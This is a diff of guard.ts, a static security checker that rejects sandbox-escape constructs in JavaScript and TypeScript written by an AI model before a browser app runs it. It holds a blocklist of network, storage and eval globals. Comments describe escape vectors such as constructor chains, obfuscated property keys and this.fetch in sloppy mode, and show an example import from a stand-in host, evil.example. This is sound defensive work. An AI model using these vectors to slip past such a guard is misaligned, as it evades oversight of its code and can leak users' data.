@@ -1,11 +1,20 @@
 /**
- * guard.ts – static security check for model-generated JavaScript.
+ * guard.ts – static security check for model-generated code.
+ *
+ * Two entry points, one set of rules:
+ *
+ *   guardCode(source)    the `evaluate` tool – a JavaScript body that runs
+ *                        against the app's API object
+ *   guardScript(source)  a TypeScript source file the model writes for the
+ *                        host's own scripting environment (classes, types,
+ *                        `this`) – see "Scripting" below
  *
  * ── Threat model ─────────────────────────────────────────────────────────────
  *
- * The model writes JavaScript that we execute in the browser against the host
- * app's API object. The code runs inside `with (api) { ... }`, which makes the
- * API functions look like globals. `with` is ergonomics, never security.
+ * The model writes code that we execute in the browser. For `evaluate` that
+ * code runs inside `with (api) { ... }`, which makes the API functions look
+ * like globals. `with` is ergonomics, never security: any identifier the API
+ * does not define falls through to the real global scope.
  *
  * The guard parses the code with acorn and rejects it *before* the first
  * statement runs if it contains a known escape vector. It is a blocklist: it
@@ -13,53 +22,62 @@
  *
  * ── Why a blocklist ──────────────────────────────────────────────────────────
  *
- * The obvious alternative is an allowlist of identifiers: resolve every name
- * against the host API's keys plus a few safe built-ins, reject the rest. It
- * fails closed on unknown globals, which is strictly stronger — but it needs to
- * know the API's names, and in a real app it cannot:
- *
- *   • The API surface is a deep object tree (`app.model.features[i].params`),
- *     not a flat list of functions.
- *   • It is built at runtime, grows during the session, or hides behind getters
- *     and proxies, so `Object.keys(api)` is incomplete the moment it is taken.
- *
- * An allowlist that does not know the real surface rejects legitimate calls,
- * and a guard that blocks the app's own API is worse than useless: the model
- * cannot work, and the developer's fix is to weaken the guard.
+ * The alternative is an allowlist of identifiers: resolve every name against
+ * the API's keys plus a few safe built-ins, reject the rest. It fails closed on
+ * unknown globals, which is strictly stronger – but it has to know the API's
+ * names, and in a real app it cannot: the API is a deep object tree, it grows
+ * during the session, it hides behind getters and proxies. An allowlist that
+ * does not know the real surface rejects legitimate calls, and a guard that
+ * blocks the app's own API gets switched off – which protects nothing.
  *
  * So the guard restricts *language constructs*, not the app's vocabulary, and
- * the security boundary moves where it belongs: to the API object. See "Limits".
+ * the security boundary sits where it belongs: on the API object. See "Limits".
  *
- * ── What it blocks ───────────────────────────────────────────────────────────
+ * ── Scripting ────────────────────────────────────────────────────────────────
  *
- *   1. `this`               → globalThis in sloppy mode
- *   2. `.constructor`       → Function("return globalThis")()
- *   3. prototype walking    → .prototype, .__proto__, getPrototypeOf, …
- *   4. `import()`           → the module system
- *   5. dangerous globals    → window, document, fetch, Image, localStorage, …
- *   6. computed obfuscation → obj["constr" + "uctor"]
+ * An app whose users write scripts will want the agent to write them too. That
+ * source is TypeScript, uses classes, and therefore uses `this` – guardCode
+ * would reject every line of it. guardScript parses TypeScript and permits
+ * classes, but applies the *same* blocklists: no window, no fetch, no eval, no
+ * dynamic import.
+ *
+ * One condition, and it is not optional: **the host must execute the script in
+ * strict mode** (as an ES module, or with a "use strict" prologue). In sloppy
+ * mode a plain function call binds `this` to globalThis, and `this.fetch(...)`
+ * walks straight around the blocklist.
  *
  * ── Limits – read this ───────────────────────────────────────────────────────
  *
  * A blocklist is incomplete by construction: every global nobody thought of is
  * reachable. Treat the guard as a strong barrier against a model that goes off
  * the rails, not as a sandbox that contains an adversary. The real boundary is
- * the API object you hand to createEvaluator: the model can do what your API
- * can do. Put nothing in it you would not let the user do — and remember that
- * any *other* execution path in your app (a scripting feature, an eval-based
- * plugin system) is a path around this guard entirely.
+ * the API you hand to the model: it can do what your API can do.
  */
 import * as acorn from "acorn";
+import { tsPlugin } from "acorn-typescript";
+
+// acorn-typescript's types are declared against its own acorn copy; the runtime
+// contract (an acorn plugin) is what matters here.
+const TypeScriptParser = acorn.Parser.extend(tsPlugin() as any);
 
 export interface GuardOptions {
   /** Identifiers to reject on top of the built-in list, e.g. your own globals. */
   extraBlocked?: string[];
   /** Names to permit despite being blocked by default. Use sparingly. */
   allowBlocked?: string[];
-  /** Max source length in characters (default 10000). */
+  /** Max source length in characters (default 10000, scripts 40000). */
   maxLength?: number;
-  /** Max AST nodes, a cheap ceiling on complexity (default 2500). */
+  /** Max AST nodes, a cheap ceiling on complexity (default 2500, scripts 10000). */
   maxNodes?: number;
+}
+
+export interface ScriptGuardOptions extends GuardOptions {
+  /**
+   * Module specifiers a static `import` may name. Anything else is rejected –
+   * an unrestricted import is an escape (`import "https://evil.example/x.js"`).
+   * Empty (the default) forbids imports entirely.
+   */
+  allowImportsFrom?: string[];
 }
 
 export interface GuardResult {
@@ -81,12 +99,12 @@ const BLOCKED_NODES: Record<string, string> = {
 };
 
 /**
- * Identifiers that must never be referenced. Two groups: names that reach the
- * function constructor (and thus arbitrary code), and names that reach the
- * outside world (network, storage, DOM) – the exfiltration channels.
+ * Identifiers that must never be referenced: names that reach the function
+ * constructor (and thus arbitrary code), and names that reach the outside world
+ * (network, storage, DOM) – the exfiltration channels.
  */
 const BLOCKED_IDENTIFIERS = new Set([
-  // ── Scope escape / code generation ───────────────────────────────────────
+  // Scope escape / code generation
   "arguments",
   "eval",
   "Function",
@@ -98,7 +116,7 @@ const BLOCKED_IDENTIFIERS = new Set([
   "Reflect",
   "WebAssembly",
 
-  // ── The global object, by any of its names ───────────────────────────────
+  // The global object, by any of its names
   "globalThis",
   "window",
   "self",
@@ -108,14 +126,14 @@ const BLOCKED_IDENTIFIERS = new Set([
   "opener",
   "frames",
 
-  // ── DOM / browsing context ───────────────────────────────────────────────
+  // DOM / browsing context
   "document",
   "location",
   "navigator",
   "history",
   "customElements",
 
-  // ── Network: the channels that turn a bug into a data leak ───────────────
+  // Network: the channels that turn a bug into a data leak
   "fetch",
   "XMLHttpRequest",
   "WebSocket",
@@ -129,27 +147,27 @@ const BLOCKED_IDENTIFIERS = new Set([
   "RTCPeerConnection",
   "postMessage",
   "importScripts",
-  "open", // window.open
+  "open",
 
-  // ── Storage ──────────────────────────────────────────────────────────────
+  // Storage
   "localStorage",
   "sessionStorage",
   "indexedDB",
   "caches",
   "cookieStore",
 
-  // ── Timers: setTimeout("code") evaluates its string argument ─────────────
+  // Timers: setTimeout("code") evaluates its string argument
   "setTimeout",
   "setInterval",
   "setImmediate",
 
-  // ── Native dialogs – the model must talk through the chat, not a popup ───
+  // Native dialogs – the model talks through the chat, not through a popup
   "alert",
   "confirm",
   "prompt",
   "print",
 
-  // ── Module systems ───────────────────────────────────────────────────────
+  // Module systems
   "require",
   "module",
   "exports",
@@ -172,29 +190,43 @@ const BLOCKED_PROPERTIES = new Set([
   "__lookupSetter__",
 ]);
 
-// The code is wrapped so that top-level `return` and `await` parse. The wrapper
-// ends in a newline, so the guarded code starts on line 2 and columns are exact.
+/**
+ * Fields that hold *types*, not values. `let element: Window` names the global
+ * Window in a type position – it compiles to nothing and executes nothing, so
+ * checking it would be a false rejection.
+ */
+const TYPE_FIELDS = new Set([
+  "typeAnnotation",
+  "typeParameters",
+  "typeArguments",
+  "returnType",
+  "superTypeArguments",
+  "superTypeParameters",
+  "implements",
+]);
+
+/** Declarations that are erased at compile time and cannot execute anything. */
+const TYPE_ONLY_NODES = new Set([
+  "TSInterfaceDeclaration",
+  "TSTypeAliasDeclaration",
+  "TSDeclareFunction",
+  "TSAbstractMethodDefinition",
+]);
+
+// The evaluate body is wrapped so top-level `return` and `await` parse. The
+// wrapper ends in a newline, so the code starts on line 2 – hence lineOffset 1.
 const WRAPPER_PREFIX = "(async function __checked__() {\n";
 
 /**
- * Checks model-generated code and reports whether it is safe to execute.
+ * Checks a JavaScript body written for the `evaluate` tool.
  * Never throws: a parse error is reported as a rejection, because that is a
  * message the model can act on.
  */
 export function guardCode(source: string, options: GuardOptions = {}): GuardResult {
-  const { extraBlocked = [], allowBlocked = [], maxLength = 10_000, maxNodes = 2500 } = options;
+  const { maxLength = 10_000, maxNodes = 2500 } = options;
 
-  if (typeof source !== "string") {
-    return { ok: false, reason: "Code must be a string." };
-  }
-  if (source.length > maxLength) {
-    return {
-      ok: false,
-      reason:
-        `Code is too long (${source.length} characters, limit ${maxLength}). ` +
-        `Split the work into several smaller calls.`,
-    };
-  }
+  const tooLong = checkLength(source, maxLength);
+  if (tooLong) return tooLong;
 
   let ast: acorn.Node;
   try {
@@ -207,12 +239,77 @@ export function guardCode(source: string, options: GuardOptions = {}): GuardResu
     return { ok: false, reason: `Syntax error: ${error?.message ?? String(error)}` };
   }
 
-  const blocked = new Set(BLOCKED_IDENTIFIERS);
-  for (const name of extraBlocked) blocked.add(name);
-  for (const name of allowBlocked) blocked.delete(name);
+  return run(ast, {
+    blocked: blocklistFor(options),
+    blockedNodes: BLOCKED_NODES,
+    maxNodes,
+    lineOffset: 1,
+    allowImportsFrom: [],
+  });
+}
 
+/**
+ * Checks a TypeScript source file the model wrote for the host's scripting
+ * environment. Classes and `this` are permitted; everything else is judged by
+ * the same rules as guardCode.
+ *
+ * The host MUST run the result in strict mode – as an ES module, or behind a
+ * "use strict" prologue. In sloppy mode `this` is globalThis in a plain call,
+ * and the blocklist is worth nothing.
+ */
+export function guardScript(source: string, options: ScriptGuardOptions = {}): GuardResult {
+  const { maxLength = 40_000, maxNodes = 10_000, allowImportsFrom = [] } = options;
+
+  const tooLong = checkLength(source, maxLength);
+  if (tooLong) return tooLong;
+
+  let ast: acorn.Node;
   try {
-    new Checker(blocked, maxNodes).visit(ast, null, new Scope(null));
+    ast = TypeScriptParser.parse(source, {
+      ecmaVersion: 2022,
+      sourceType: "module", // top-level await, import/export, and strict by default
+      locations: true,
+    });
+  } catch (error: any) {
+    return { ok: false, reason: `Syntax error: ${error?.message ?? String(error)}` };
+  }
+
+  // `this` is what classes are made of, so it cannot be blocked here. It is
+  // safe only because a module is strict-mode code – see the doc comment.
+  const { ThisExpression: _dropped, ...blockedNodes } = BLOCKED_NODES;
+
+  return run(ast, {
+    blocked: blocklistFor(options),
+    blockedNodes,
+    maxNodes,
+    lineOffset: 0,
+    allowImportsFrom,
+  });
+}
+
+function checkLength(source: string, maxLength: number): GuardResult | null {
+  if (typeof source !== "string") return { ok: false, reason: "Code must be a string." };
+  if (source.length > maxLength) {
+    return {
+      ok: false,
+      reason:
+        `Code is too long (${source.length} characters, limit ${maxLength}). ` +
+        `Split the work into smaller pieces.`,
+    };
+  }
+  return null;
+}
+
+function blocklistFor(options: GuardOptions): Set<string> {
+  const blocked = new Set(BLOCKED_IDENTIFIERS);
+  for (const name of options.extraBlocked ?? []) blocked.add(name);
+  for (const name of options.allowBlocked ?? []) blocked.delete(name);
+  return blocked;
+}
+
+function run(ast: acorn.Node, config: Config): GuardResult {
+  try {
+    new Checker(config).visit(ast, null, new Scope(null));
     return { ok: true };
   } catch (violation) {
     if (violation instanceof Violation) {
@@ -226,17 +323,24 @@ export function guardCode(source: string, options: GuardOptions = {}): GuardResu
 
 type Node = any;
 
+interface Config {
+  blocked: Set<string>;
+  blockedNodes: Record<string, string>;
+  maxNodes: number;
+  lineOffset: number;
+  allowImportsFrom: string[];
+}
+
 /**
  * A blocked name only means the *global* of that name. `open`, `parent`, `top`
  * and `self` are ordinary variable names, and the model will use them:
  *
  *   const open = tasks.filter((t) => !t.done);   // nothing to do with window.open
  *
- * So the guard tracks what the code declares. A blocked identifier is only a
- * violation when it is a *free* reference – nothing in an enclosing scope
- * declares it. A locally declared name cannot reach the global it shadows, so
- * allowing it is safe, and rejecting it would be a false positive on ordinary
- * code – the failure mode that makes developers turn a guard off.
+ * So the guard tracks what the code declares, and a blocked identifier is only
+ * a violation as a *free* reference. A declared name cannot reach the global it
+ * shadows, and rejecting it would be a false positive on ordinary code – the
+ * failure mode that makes people turn a guard off.
  */
 class Scope {
   readonly names = new Set<string>();
@@ -257,45 +361,48 @@ class Scope {
 class Checker {
   private count = 0;
 
-  constructor(
-    private readonly blocked: Set<string>,
-    private readonly maxNodes: number
-  ) {}
+  constructor(private readonly config: Config) {}
 
   visit(node: Node, parent: Node, scope: Scope): void {
     if (!node || typeof node !== "object" || typeof node.type !== "string") return;
 
-    if (++this.count > this.maxNodes) {
+    // Types are erased before anything runs; an identifier in a type position
+    // is not a reference to the global of that name.
+    if (TYPE_ONLY_NODES.has(node.type)) return;
+
+    if (++this.count > this.config.maxNodes) {
       throw new Violation(
-        `Code is too complex (over ${this.maxNodes} syntax nodes). Keep it simple and split the work.`,
-        node
+        `Code is too complex (over ${this.config.maxNodes} syntax nodes). Split the work.`,
+        node,
+        this.config.lineOffset
       );
     }
 
-    const blockedNode = BLOCKED_NODES[node.type];
-    if (blockedNode) throw new Violation(blockedNode, node);
+    const blockedNode = this.config.blockedNodes[node.type];
+    if (blockedNode) throw new Violation(blockedNode, node, this.config.lineOffset);
+
+    if (node.type === "ImportDeclaration") this.checkImport(node);
 
     if (
       node.type === "Identifier" &&
-      this.blocked.has(node.name) &&
+      this.config.blocked.has(node.name) &&
       isReference(node, parent) &&
       !scope.has(node.name)
     ) {
       throw new Violation(
-        `"${node.name}" is not allowed. Use only the documented API functions and plain JavaScript.`,
-        node
+        `"${node.name}" is not allowed. Use only the documented API and plain code.`,
+        node,
+        this.config.lineOffset
       );
     }
 
-    if (node.type === "MemberExpression") checkMemberAccess(node);
+    if (node.type === "MemberExpression") this.checkMemberAccess(node);
 
     if (isFunction(node)) {
       const inner = new Scope(scope);
       if (node.id?.name) inner.declare(node.id.name);
       for (const param of node.params ?? []) declarePattern(param, inner);
-      if (node.body?.type === "BlockStatement") {
-        hoistVars(node.body, inner); // `var` and function declarations, function-wide
-      }
+      if (node.body?.type === "BlockStatement") hoistVars(node.body, inner);
       this.visitChildren(node, inner);
       return;
     }
@@ -315,8 +422,8 @@ class Checker {
     }
 
     if (node.type === "VariableDeclarator") {
-      // `const open = …` at the current level: declare before the initialiser is
-      // visited, so `const parent = node.parent` does not trip on its own name.
+      // Declare before the initialiser is visited, so `const parent = x.parent`
+      // does not trip over its own name.
       declarePattern(node.id, scope);
     }
 
@@ -326,6 +433,8 @@ class Checker {
   private visitChildren(node: Node, scope: Scope): void {
     for (const key of Object.keys(node)) {
       if (key === "type" || key === "loc" || key === "start" || key === "end") continue;
+      if (TYPE_FIELDS.has(key)) continue;
+
       const child = node[key];
       if (Array.isArray(child)) {
         for (const item of child) this.visit(item, node, scope);
@@ -333,6 +442,64 @@ class Checker {
         this.visit(child, node, scope);
       }
     }
+  }
+
+  /** A free import is an escape: `import "https://evil.example/x.js"` runs it. */
+  private checkImport(node: Node): void {
+    const specifier = String(node.source?.value ?? "");
+    if (!this.config.allowImportsFrom.includes(specifier)) {
+      const allowed = this.config.allowImportsFrom.length
+        ? `Allowed: ${this.config.allowImportsFrom.join(", ")}.`
+        : "Imports are not allowed here.";
+      throw new Violation(
+        `Cannot import from "${specifier}". ${allowed}`,
+        node,
+        this.config.lineOffset
+      );
+    }
+  }
+
+  /**
+   * Property access is where the constructor chain lives.
+   *
+   * Static:    obj.constructor            → checked against BLOCKED_PROPERTIES
+   * Computed:  obj[0], obj[i], obj["key"] → allowed (string literals are checked)
+   *            obj["constr" + "uctor"]    → rejected: a key computed from an
+   *            obj[keys[j]], obj[fn()]      expression can spell out anything at
+   *                                         runtime, so it cannot be checked here.
+   *
+   * If the model genuinely needs a dynamic lookup over an app object tree, give
+   * it an API function (`getProperty(obj, name)`) that validates the name.
+   */
+  private checkMemberAccess(node: Node): void {
+    const offset = this.config.lineOffset;
+
+    if (!node.computed) {
+      const name = node.property?.name;
+      if (name && BLOCKED_PROPERTIES.has(name)) {
+        throw new Violation(`Accessing .${name} is not allowed.`, node.property, offset);
+      }
+      return;
+    }
+
+    const key = node.property;
+    if (key?.type === "Literal") {
+      if (typeof key.value === "number") return;
+      if (typeof key.value === "string") {
+        if (BLOCKED_PROPERTIES.has(key.value)) {
+          throw new Violation(`Accessing ["${key.value}"] is not allowed.`, key, offset);
+        }
+        return;
+      }
+    }
+    if (key?.type === "Identifier") return; // items[i] – the identifier is checked on its own
+
+    throw new Violation(
+      'Computed property access must be a plain name, number or string literal ' +
+        '(items[i], items[0], obj["name"]) – not an expression.',
+      key ?? node,
+      offset
+    );
   }
 }
 
@@ -349,7 +516,6 @@ function declareBlockBindings(block: Node, scope: Scope): void {
       if (statement.id?.name) scope.declare(statement.id.name);
     }
   }
-  // for (const item of list) / for (let i = 0; …)
   for (const part of [block.left, block.init]) {
     if (part?.type === "VariableDeclaration") {
       for (const declarator of part.declarations) declarePattern(declarator.id, scope);
@@ -383,7 +549,7 @@ function hoistVars(node: Node, scope: Scope): void {
   }
 }
 
-/** Declares every binding a destructuring pattern introduces. */
+/** Declares every binding a pattern introduces, including TS parameter properties. */
 function declarePattern(pattern: Node, scope: Scope): void {
   if (!pattern || typeof pattern !== "object") return;
   switch (pattern.type) {
@@ -403,6 +569,9 @@ function declarePattern(pattern: Node, scope: Scope): void {
       return;
     case "RestElement":
       declarePattern(pattern.argument, scope);
+      return;
+    case "TSParameterProperty": // constructor(private depth: number)
+      declarePattern(pattern.parameter, scope);
       return;
   }
 }
@@ -424,50 +593,9 @@ function isLoop(node: Node): boolean {
 }
 
 /**
- * Property access is where the constructor chain lives.
- *
- * Static:    obj.constructor            → checked against BLOCKED_PROPERTIES
- * Computed:  obj[0], obj[i], obj["key"] → allowed (string literals are checked)
- *            obj["constr" + "uctor"]    → rejected: a key computed from an
- *            obj[keys[j]], obj[fn()]      expression can spell out anything at
- *                                         runtime, so it cannot be checked here.
- *
- * If the model genuinely needs a dynamic lookup over an app object tree, expose
- * a helper on the API (`getProperty(obj, name)`) that validates the name.
- */
-function checkMemberAccess(node: Node): void {
-  if (!node.computed) {
-    const name = node.property?.name;
-    if (name && BLOCKED_PROPERTIES.has(name)) {
-      throw new Violation(`Accessing .${name} is not allowed.`, node.property);
-    }
-    return;
-  }
-
-  const key = node.property;
-  if (key?.type === "Literal") {
-    if (typeof key.value === "number") return;
-    if (typeof key.value === "string") {
-      if (BLOCKED_PROPERTIES.has(key.value)) {
-        throw new Violation(`Accessing ["${key.value}"] is not allowed.`, key);
-      }
-      return;
-    }
-  }
-  if (key?.type === "Identifier") return; // items[i] – the identifier is checked on its own
-
-  throw new Violation(
-    'Computed property access must be a plain name, number or string literal ' +
-      '(items[i], items[0], obj["name"]) – not an expression.',
-    key ?? node
-  );
-}
-
-/**
  * True when an identifier is used as a *name in its own right* rather than as a
  * property, an object key or a label. `task.location` is a field on the app's
- * data and has nothing to do with the global `location`, so it must not trip
- * the blocklist – the BLOCKED_PROPERTIES check covers the dangerous ones.
+ * data and has nothing to do with the global `location`.
  */
 function isReference(node: Node, parent: Node): boolean {
   if (!parent) return true;
@@ -476,7 +604,6 @@ function isReference(node: Node, parent: Node): boolean {
     case "MemberExpression":
       return parent.computed || parent.property !== node;
     case "Property":
-      // `{ shorthand }` is key and value at once – still a reference.
       return parent.computed || parent.key !== node || parent.shorthand;
     case "MethodDefinition":
     case "PropertyDefinition":
@@ -492,9 +619,12 @@ function isReference(node: Node, parent: Node): boolean {
 
 class Violation {
   readonly at?: { line: number; column: number };
-  constructor(readonly reason: string, node: Node) {
+  constructor(
+    readonly reason: string,
+    node: Node,
+    lineOffset: number
+  ) {
     const start = node?.loc?.start;
-    // Line 1 is the wrapper, so the model's own code starts on line 2.
-    if (start) this.at = { line: Math.max(1, start.line - 1), column: start.column };
+    if (start) this.at = { line: Math.max(1, start.line - lineOffset), column: start.column };
   }
 }
